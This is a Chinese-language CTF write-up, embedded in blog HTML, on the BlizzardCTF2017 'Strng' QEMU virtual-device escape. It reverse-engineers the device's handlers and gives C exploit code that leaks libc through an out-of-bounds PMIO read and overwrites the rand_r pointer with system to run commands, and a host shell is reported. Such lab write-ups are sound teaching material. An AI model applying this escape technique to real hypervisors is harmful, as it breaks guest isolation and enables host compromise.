@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="1.打开虚拟环境，然后都说flag在&#x2F;root&#x2F;flag，给的也不是vmlinux，那么就应该是qemu逃逸。 2.由于只有文件，大佬们都直接告诉用户名密码，也没说怎么找，那就当作本来题目给了用户名和密码。用户名是ubuntu，密码是passw0rd。 3.将qemu-system-x86_64拖到IDA中开始分析，会分析很长一段时间，先看看启动参数，launch.sh： 12345678910.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BlizzardCTF2017-Strng">
+<meta property="og:url" content="http://pig-007.github.io/2021/08/14/BlizzardCTF2017-Strng/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="1.打开虚拟环境，然后都说flag在&#x2F;root&#x2F;flag，给的也不是vmlinux，那么就应该是qemu逃逸。 2.由于只有文件，大佬们都直接告诉用户名密码，也没说怎么找，那就当作本来题目给了用户名和密码。用户名是ubuntu，密码是passw0rd。 3.将qemu-system-x86_64拖到IDA中开始分析，会分析很长一段时间，先看看启动参数，launch.sh： 12345678910.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502897.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502926.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502018.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502953.jpeg">
+<meta property="article:published_time" content="2021-08-14T05:40:30.000Z">
+<meta property="article:modified_time" content="2021-08-19T07:03:04.873Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="qemu题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg"><title>BlizzardCTF2017-Strng | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/08/14/BlizzardCTF2017-Strng/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">BlizzardCTF2017-Strng</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><p>1.打开虚拟环境，然后都说flag在/root/flag，给的也不是vmlinux，那么就应该是qemu逃逸。</p>
+<p>2.由于只有文件，大佬们都直接告诉用户名密码，也没说怎么找，那就当作本来题目给了用户名和密码。用户名是ubuntu，密码是passw0rd。</p>
+<p>3.将qemu-system-x86_64拖到IDA中开始分析，会分析很长一段时间，先看看启动参数，launch.sh：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></div></figure>
+
+<p>没啥好注意的，显示加载了设备strng，那么这应该就是需要分析的PCI设备。然后最后一行netdev user,id=net0,hostfwd=tcp::5555-:22，把22端口重定向到了宿主机的5555端口，所以使用ssh <span class="exturl"><a class="exturl__link"   href="mailto:&#x75;&#x62;&#x75;&#110;&#x74;&#117;&#x40;&#49;&#50;&#x37;&#46;&#x30;&#46;&#48;&#x2e;&#x31;" >&#x75;&#x62;&#x75;&#110;&#x74;&#117;&#x40;&#49;&#50;&#x37;&#46;&#x30;&#46;&#48;&#x2e;&#x31;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> -p 5555进去。同时这里注意加载内存要1G，为了防止崩溃，我改成了128M。</p>
+<p>4.然后进入qemu中看看设备信息，好找到mmio和pmio的地址：</p>
+<p>(1)首先输入lspci，可以看到有一个Unclassified device</p>
+<p>00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</p>
+<p>这个就应该是strng设备了。</p>
+<p>(2)加载IDA完成之后验证一下，函数栏搜索strng，查看相关函数。先查看设备初始化函数：strng_class_init。(这里需要将变量k的类型设置为PCIDeviceClass*)</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg" alt="img"></p>
+<p>可以看到加载了strng设备，然后设备号device_id是0x11e9，vendor_id是0x1234，对应在qemu中查看一下刚才猜测的strng设备，输入：lspci -v -s 00:03.0</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502897.jpeg" alt="img"></p>
+<p>可以看到猜测没错。同时可以看到对应的mmio地址为0xfebf1000，大小256。pmio的地址为0xc050，大小8。</p>
+<p>▲有时候这些命令可能不好使，判断完设备号之后，可以输入：</p>
+<p>hexdump /sys/devices/pci0000:00/0000:00:03.0/config来查看</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502926.jpeg" alt="img"></p>
+<p>5.之后从read和write函数中找漏洞：</p>
+<p>这里将第一个参数opaque修改下类型为：struct STRNGState<em>，至于为什么是这个，打开read和write的汇编代码，很明显发现有STRNGState</em>，然后再跳转到结构体界面中找，虽然不太好找。找到之后双击，可以显示出结构体的所有成员，发现就是需要的那个：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502018.jpeg" alt="img"></p>
+<p>(1)先看strng_mmio_read函数，读入addr并按二进制将其右移两位，相当于除以4，之后将结果作为regs数组的索引，返回该regs[add&gt;&gt;2]的值。同时还需要注意的是addr的低两位只能为0，否则过不了if ( size == 4 &amp;&amp; !(addr &amp; 3) )的检查。</p>
+<p>(2)再看strng_mmio_write函数：</p>
+<p>当size等于4时，将addr右移两位得到寄存器的索引idx，并提供4个功能：</p>
+<p>①当idx为0时，调用srand函数但并不给赋值给内存。当i为1时，调用rand得到随机数并赋值给regs[1]。</p>
+<p>②当idx为3时，调用rand_r函数，使用regs[2]的地址作为参数，最后将返回值赋值regs[3]，但后续仍然会将val值覆盖到regs[3]中，就是迷惑用的，实际功能也就是将传入的value赋值给regs[3]。</p>
+<p>▲但是这里的传regs[2]的地址也是一个关键，如果我们能将rand_r函数劫持为system函数，然后在regs[2]中放入”cat /root/flag”字符串，那不就可以调用system(“cat /root/flag”)从而读取flag了吗。</p>
+<p>其余则直接将传入的value赋值给regs[idx]。</p>
+<p>那么通过控制addr，进而控制idx&gt;=2，就可以逐次将4个字节数据写入到regs[idx]上。</p>
+<p>▲按理说如果将idx超出regs数组范围，64之后，那么不就可以任意越界写了吗，但是这里不行，因为传入的addr是不能大于mmio的大小，pci设备内部会进行检查，而刚好regs的大小为256，所以无法通过mmio进行越界读写。</p>
+<p>(3)接着看strng_pmio_read函数：当传入的端口地址addr为0时，直接返回opaque-&gt;addr，否则将opaque-&gt;addr右移两位作为索引idx，返回regs[idx]的值。这个opaque-&gt;addr在strng_pmio_write中被赋值。</p>
+<p>(4)然后再看strng_pmio_write函数：</p>
+<p>当size等于4时，以传入的端口地址为判断提供4个功能：</p>
+<p>①当传入的端口地址addr为0时，直接将传入的value赋值给opaque-&gt;addr。</p>
+<p>②当传入的端口地址addr不为0时，将opaque-&gt;addr右移两位得到索引idx，分为三个功能：</p>
+<p>A.idx为0时，执行srand，返回值不存储。</p>
+<p>B.idx为1时，执行rand并将返回结果存储到regs[1]中。</p>
+<p>C.idx为3时，调用rand_r并将regs[2]的地址作为第一个参数，返回值存储到regs[3]中。<br>否则直接将value存储到regs[idx]中。</p>
+<p>▲这里就可以调用strng_pmio_write函数，形成任意地址写漏洞。</p>
+<p>A.通过将addr设置为0，然后使得传入的value直接赋值给opaque-&gt;addr，使得opaque-&gt;addr形成的索引idx大于64，将reg[idx]越界指向rand_r函数指针。</p>
+<p>B.然后再次调用strng_pmio_write函数，传入不为0的addr。通过opaque-&gt;addr形成的索引idx，使得regs[idx]指向rand_r函数指针，将value越界写入rand_r，劫持rand_r函数。</p>
+<p>6.那么总的利用过程就清楚了：</p>
+<p>(1)通过strng_mmio_write函数，将regs[2]赋值为”cat /root/flag”。</p>
+<p>(2)通过strng_pmio_write函数，将rand_r函数劫持为system函数。</p>
+<p>之后再调用strng_mmio_write函数，使得idx为3，然后将regs[2]的地址作为参数，调用rand_r函数，从而调用system(“cat /root/flag”)获取flag。</p>
+<p>7.但是现在还需要system函数的地址，通过上面分析，可以发现有一个越界读漏洞：</p>
+<p>(1)通过strng_pmio_write函数设置opaque-&gt;addr，使得opaque-&gt;addr形成的索引idx大于64，进而使得regs[idx]指向srand函数。</p>
+<p>(2)通过strng_pmio_read函数，借助修改后的opaque-&gt;addr，读取idx索引regs[idx]指向的内容，也就是srand函数指针中的内容，对应的就是srand函数地址。</p>
+<p>(这里大多数的exp都是针对srandom函数来泄露libc的，但rand或者rand_r应该也都可以)</p>
+<p>8.那么现在总的利用过程就是泄露libc地址，然后改写rand_r函数为system函数，将”cat /root/flag”写入到regs[2]，之后通过rand_r(regs[2])来调用system(“cat /root/flag”)从而获得flag。</p>
+<p>9.开始编写poc：</p>
+<p>(1)写好访问pmio和mmio空间的调用函数，及前置参数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">unsigned char* mmio_mem;</span><br><span class="line">uint32_t pmio_base=0xc050;</span><br><span class="line"></span><br><span class="line">void die(const char* msg)</span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;//用来打印错误信息，退出用的，不写也没关系</span><br><span class="line"></span><br><span class="line">void mmio_write(uint32_t addr, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    *((uint32_t*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t mmio_read(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    return *((uint32_t*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t pmio_write(uint32_t addr, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint32_t pmio_read(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    return (uint32_t)inl(addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)打开resource0文件，利用mmap将mmio空间映射出来：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">// Open and map I/O memory for the strng device</span><br><span class="line">int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);</span><br><span class="line">if (mmio_fd == -1)</span><br><span class="line">    die(&quot;mmio_fd open failed&quot;);</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);</span><br><span class="line">if (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(&quot;mmap mmio_mem failed&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;mmio_mem @ %p\n&quot;, mmio_mem);</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)对mmio空间进行写操作，调用strng_mmio_write函数，将”cat /root/flag”写入到regs[2]中：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">mmio_write(8,0x20746163);</span><br><span class="line">mmio_write(12,0x6f6f722f);</span><br><span class="line">mmio_write(16,0x6c662f74);</span><br><span class="line">mmio_write(20,0x6761);</span><br></pre></td></tr></table></div></figure>
+
+<p>这里由于需要满足传入的addr右移两位后形成的idx需要&gt;=2，所以从8依次开始。</p>
+<p>(4)编写pmio空间越界读和越界写的函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint32_t pmio_arbread(uint32_t offset)</span><br><span class="line">&#123;</span><br><span class="line">    pmio_write(pmio_base+0,offset);</span><br><span class="line">    return pmio_read(pmio_base+4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void pmio_abwrite(uint32_t offset, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    pmio_write(pmio_base+0,offset);</span><br><span class="line">    pmio_write(pmio_base+4,value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>(5)利用pmio空间越界读取漏洞，泄露libc地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">if (iopl(3) !=0 )</span><br><span class="line">    die(&quot;I/O permission is not enough&quot;);</span><br><span class="line"></span><br><span class="line">// leaking libc address</span><br><span class="line">uint64_t srandom_addr=pmio_arbread(0x108);</span><br><span class="line">srandom_addr=srandom_addr&lt;&lt;32;</span><br><span class="line">srandom_addr+=pmio_arbread(0x104);</span><br><span class="line">//这里的都是为了设置idx从而读取用的</span><br><span class="line"></span><br><span class="line">printf(&quot;leaking srandom addr: 0x%llx\n&quot;,srandom_addr);</span><br><span class="line">uint64_t libc_base= srandom_addr-0x43bb0;</span><br><span class="line">uint64_t system_addr= libc_base+0x4f440;</span><br><span class="line">printf(&quot;libc base: 0x%llx\n&quot;,libc_base);</span><br><span class="line">printf(&quot;system addr: 0x%llx\n&quot;,system_addr);</span><br><span class="line">//不同的主机环境的libc版本不同，需要修改</span><br></pre></td></tr></table></div></figure>
+
+<p>(6)利用越界写，将rand_r函数改写成system函数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">// overwrite rand_r pointer to system</span><br><span class="line">pmio_abwrite(0x114,system_addr&amp;0xffffffff);</span><br><span class="line"></span><br><span class="line">mmio_write(0xc,0);//补0</span><br></pre></td></tr></table></div></figure>
+
+<p>最后编译：gcc -m32 -O0 -static -o exp exp.c，然后传到虚拟机里面，可以用下列两种方法：</p>
+<p>①scp -P5555 exp <span class="exturl"><a class="exturl__link"   href="mailto:&#117;&#98;&#x75;&#110;&#x74;&#x75;&#x40;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;" >&#117;&#98;&#x75;&#110;&#x74;&#x75;&#x40;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>:/home/ubuntu，由于开了端口，所以可以直接通过scp端口传输。</p>
+<p>②使用python库简易搭建一个ftp传输：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#主机中运行</span><br><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line">#qemu中运行，其中ip地址需要改变一下，对于主机ip</span><br><span class="line">wget -O ./exp http://192.168.80.132:8000/exp</span><br></pre></td></tr></table></div></figure>
+
+<p>最后可以看到成功运行：这里我修改了cat /root/flag命令，变成/bin/sh，可以看到返回了一个主机里面的终端sh，成功实现逃逸。但是这个终端sh输入命令不显示，回显消息比较慢，但是个确确实实的主机终端，如果有条件的话，应该是可以实现多重逃逸的。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502953.jpeg" alt="img"></p>
+<p>▲qemu逃逸调试：</p>
+<p>1.将exp传进qemu之后，在主机上使用命令ps aux|grep qemu，找到qemu的任务id，然后gdb attach qemu_id。</p>
+<p>2.下断点在需要的函数：b *strng_mmio_write，然后输入c接着运行。</p>
+<p>3.在qemu中sudo ./exp，现在就能在主机的gdb中停下来，就可以调试了。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">p *strng</span><br><span class="line">p strng.regs[1]</span><br><span class="line">p strng.srand</span><br></pre></td></tr></table></div></figure>
+
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/search?keyword=qemu" >https://xz.aliyun.com/search?keyword=qemu</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup" >https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/08/14/BlizzardCTF2017-Strng/">http://pig-007.github.io/2021/08/14/BlizzardCTF2017-Strng/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/qemu%E9%A2%98/">qemu题</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/08/14/CISCN2021%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%A4%8D%E7%8E%B0/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">CISCN2021东北赛区复现</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/14/CSAW%20Quals%20CTF%202017-pilot/"><span class="paginator-prev__text">CSAW Quals CTF 2017-pilot</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
